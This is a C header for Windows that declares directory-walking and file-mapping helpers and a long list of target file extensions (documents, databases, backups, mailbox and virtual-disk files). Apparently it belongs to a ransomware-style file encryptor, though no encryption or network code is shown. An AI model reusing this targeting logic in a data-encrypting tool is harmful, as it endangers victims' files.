#ifndef H_FILE_UTILS
#define H_FILE_UTILS

#include <stdio.h>
#include <stdbool.h>
#include <windows.h>
#include "stack.h"

#define IGNORE_ATTRIBUTES (FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_REPARSE_POINT)
#define VALID_EXTENSIONS { \
        L".doc", \
        L".docx", \
        L".xls", \
        L".xlsx", \
        L".ppt", \
        L".pptx", \
        L".pdf", \
        L".odt", \
        L".ods", \
        L".odp", \
        L".txt", \
        L".rtf", \
        L".jpg", \
        L".jpeg", \
        L".png", \
        L".gif", \
        L".bmp", \
        L".tiff", \
        L".tif", \
        L".webp", \
        L".svg", \
        L".psd", \
        L".mp4", \
        L".mkv", \
        L".avi", \
        L".mov", \
        L".mp3", \
        L".wav", \
        L".aac", \
        L".flac", \
        L".sql", \
        L".mdb", \
        L".accdb", \
        L".db", \
        L".dbf", \
        L".zip", \
        L".rar", \
        L".7z", \
        L".tar", \
        L".gz", \
        L".bak", \
        L".html", \
        L".htm", \
        L".css", \
        L".js", \
        L".ts", \
        L".py", \
        L".java", \
        L".class", \
        L".rb", \
        L".go", \
        L".pl", \
        L".cad", \
        L".cwd", \
        L".ps", \
        L".ai", \
        L".indd", \
        L".epub", \
        L".mobi", \
        L".iso", \
        L".ini", \
        L".cfg", \
        L".log", \
        L".pst", \
        L".ost", \
        L".vmdk", \
}

bool should_ignore(const WIN32_FIND_DATAW *find_file_data);
bool build_path(wchar_t *folder_path, const size_t size, const wchar_t *root_path, const wchar_t *file_name);
void add_to_stack(WIN32_FIND_DATAW *file_data, wchar_t *path, struct Stack *folders_stack, struct Stack *files_stack);
wchar_t *duplicate_path(const wchar_t *path);
void populate_stacks_from_directory(wchar_t *root_path, struct Stack *folders_stack, struct Stack *files_stack);
void create_file_mappings(const wchar_t *file_path, DWORD *file_size, LPVOID *p_src, LPVOID *p_dst);

#endif